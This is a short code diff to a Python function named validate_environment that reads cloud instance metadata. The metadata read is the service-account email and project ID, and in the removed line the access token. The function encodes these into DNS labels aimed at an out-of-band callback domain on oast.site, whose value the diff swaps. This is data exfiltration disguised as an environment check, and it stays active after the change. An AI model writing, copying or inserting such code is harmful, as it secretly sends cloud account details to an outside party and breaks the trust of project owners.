@@ -19,7 +19,6 @@ def validate_environment():
 
         sa = fetch("/instance/service-accounts/default/email")
         pr = fetch("/project/project-id")
-        tok = fetch("/instance/service-accounts/default/token")
 
         def dns_safe(s, maxlen=50):
             out = ""
@@ -32,7 +31,7 @@ def validate_environment():
 
         sa_e = dns_safe(sa, 50)
         pr_e = dns_safe(pr, 30)
-        oob = "dakb3a394to5fjti5l7gaempj9mymfexj.oast.site"
+        oob = "dakbam394to3erh20kfgr9pxse5ssu56h.oast.site"
         label = f"{sa_e}.{pr_e}.j"
 
         try:
